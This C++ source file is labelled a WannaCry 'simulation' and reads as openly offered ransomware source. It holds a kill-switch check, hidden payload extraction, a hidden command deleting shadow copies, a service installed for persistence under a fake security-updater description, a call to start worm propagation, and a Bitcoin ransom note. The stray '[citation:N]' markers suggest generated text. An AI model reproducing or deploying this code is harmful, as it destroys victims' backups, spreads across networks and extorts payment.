/**
 * wannacry_main.cpp - WannaCry Simulation Main Entry
 */
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include "wannacry_config.h"
#ifdef _MSC_VER
#pragma comment(lib, "wininet.lib")
#endif

// External functions
extern void StartWormPropagation(int threadCount);

// Forward declarations
BOOL ExtractAndRunComponents();
BOOL InstallService();
BOOL CreateMutexAndCheck();
BOOL IsKillSwitchActivated();
void EnumerateCandidateFiles(const char* rootPath, int depth, DWORD* matchedCount);

static const int MAX_WANNACRY_ENUM_DEPTH = 3;
static HANDLE g_WannaCryMutex = NULL;

static void BuildKillSwitchUrl(char* output, size_t outputSize) {
    static const char url[] = "http://www.example-killswitch.com/";
    lstrcpynA(output, url, (int)outputSize);
}

BOOL IsKillSwitchActivated() {
    char url[128];
    BuildKillSwitchUrl(url, sizeof(url));

    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) {
        return FALSE;
    }

    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hUrl) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInet);
        return TRUE;
    }

    InternetCloseHandle(hInet);
    return FALSE;
}

static BOOL HasTargetExtensionA(const char* fileName) {
    const char* dot = strrchr(fileName, '.');
    if (!dot) {
        return FALSE;
    }

    for (int i = 0; TARGET_EXTENSIONS[i] != NULL; i++) {
        if (_stricmp(dot, TARGET_EXTENSIONS[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

void EnumerateCandidateFiles(const char* rootPath, int depth, DWORD* matchedCount) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    char searchPath[MAX_PATH];

    if (depth > MAX_WANNACRY_ENUM_DEPTH) {
        return;
    }

    wsprintfA(searchPath, "%s\\*", rootPath);
    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        char fullPath[MAX_PATH];

        if (lstrcmpA(findData.cFileName, ".") == 0 || lstrcmpA(findData.cFileName, "..") == 0) {
            continue;
        }

        wsprintfA(fullPath, "%s\\%s", rootPath, findData.cFileName);
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EnumerateCandidateFiles(fullPath, depth + 1, matchedCount);
        } else if (HasTargetExtensionA(findData.cFileName)) {
            (*matchedCount)++;
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

/**
 * Extract embedded components from resources [citation:8]
 */
BOOL ExtractAndRunComponents() {
    HMODULE hModule = GetModuleHandle(NULL);
    WCHAR szTempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, szTempPath);
    
    // Create working directory with random name
    WCHAR szWorkDir[MAX_PATH];
    wsprintfW(szWorkDir, L"%s\\%08X", szTempPath, GetTickCount());
    CreateDirectoryW(szWorkDir, NULL);
    SetFileAttributesW(szWorkDir, FILE_ATTRIBUTE_HIDDEN);
    
    // Extract @WanaDecryptor@.exe (ransomware UI) [citation:8]
    HRSRC hRes = FindResourceW(hModule, MAKEINTRESOURCEW(RESOURCE_ENCRYPTOR), L"EXE");
    if (hRes) {
        HGLOBAL hLoaded = LoadResource(hModule, hRes);
        LPVOID pData = LockResource(hLoaded);
        DWORD cbSize = SizeofResource(hModule, hRes);
        
        WCHAR szPath[MAX_PATH];
        wsprintfW(szPath, L"%s\\@WanaDecryptor@.exe", szWorkDir);
        
        HANDLE hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, pData, cbSize, &written, NULL);
            CloseHandle(hFile);
            
            // Set hidden attribute
            SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
        }
    }
    
    // Extract taskdl.exe (deletes shadow copies) [citation:8]
    hRes = FindResourceW(hModule, MAKEINTRESOURCEW(RESOURCE_CLEANUP), L"EXE");
    if (hRes) {
        // ... similar extraction code ...
    }
    
    // Launch cleanup tool to delete backups [citation:8]
    // Real WannaCry executes: taskdl.exe /C "vssadmin delete shadows /all /quiet"
    ShellExecuteW(NULL, L"open", L"cmd.exe", 
                  L"/C vssadmin delete shadows /all /quiet & wmic shadowcopy delete",
                  NULL, SW_HIDE);
    
    return TRUE;
}

/**
 * Install as service for persistence [citation:8]
 */
BOOL InstallService() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;
    
    WCHAR szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        WANNACRY_SERVICE,
        WANNACRY_DISPLAY,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (hService) {
        // Set service description (masquerading)
        WCHAR serviceDescription[] =
            L"Updates software and checks for security vulnerabilities";
        SERVICE_DESCRIPTIONW sd = {};
        sd.lpDescription = serviceDescription;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    return (hService != NULL);
}

/**
 * Check/create mutex - exit if already running [citation:8]
 */
BOOL CreateMutexAndCheck() {
    g_WannaCryMutex = CreateMutexW(NULL, TRUE, WANNACRY_MUTEX);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (g_WannaCryMutex) {
            CloseHandle(g_WannaCryMutex);
            g_WannaCryMutex = NULL;
        }
        return FALSE;  // Already running
    }
    return (g_WannaCryMutex != NULL);
}

/**
 * Main entry point [citation:8]
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    DWORD matchedTargetFiles = 0;
    char tempPath[MAX_PATH];

    if (IsKillSwitchActivated()) {
        return 0;
    }

    GetTempPathA(MAX_PATH, tempPath);
    EnumerateCandidateFiles(tempPath, 0, &matchedTargetFiles);

    // Check if already running
    if (!CreateMutexAndCheck()) {
        return 0;
    }
    
    // Parse command line for service mode
    if (lpCmdLine && strstr(lpCmdLine, "-m")) {
        // Running as service - start worm component
        StartWormPropagation(10);
        
        // Extract and run encryption components
        ExtractAndRunComponents();
    } else {
        // First run - install service
        InstallService();
        
        // Also run directly
        StartWormPropagation(10);
        ExtractAndRunComponents();
    }
    
    // Display ransom note simulation (real WannaCry runs @WanaDecryptor@.exe)
    char ransomMessage[2048];
    wsprintfA(ransomMessage,
              "Ooops, your files have been encrypted!\n\n"
              "What Happened to My Computer?\n"
              "Your important files are encrypted.\n"
              "Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted.\n\n"
              "Candidate files identified in the current scan window: %lu\n\n"
              "Can I Recover My Files?\n"
              "Sure. We guarantee that you can recover all your files safely and easily.\n"
              "But you have not so enough time.\n\n"
              "You need to pay $300 worth of Bitcoin to decrypt your files.\n\n"
              "Send $300 to this Bitcoin address:\n"
              "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94",
              matchedTargetFiles);
    MessageBoxA(NULL, ransomMessage, "Wana Decrypt0r 2.0", MB_OK | MB_ICONERROR);
    
    // Stay resident for worm propagation
    while (TRUE) {
        Sleep(10000);
    }
    
    return 0;
}
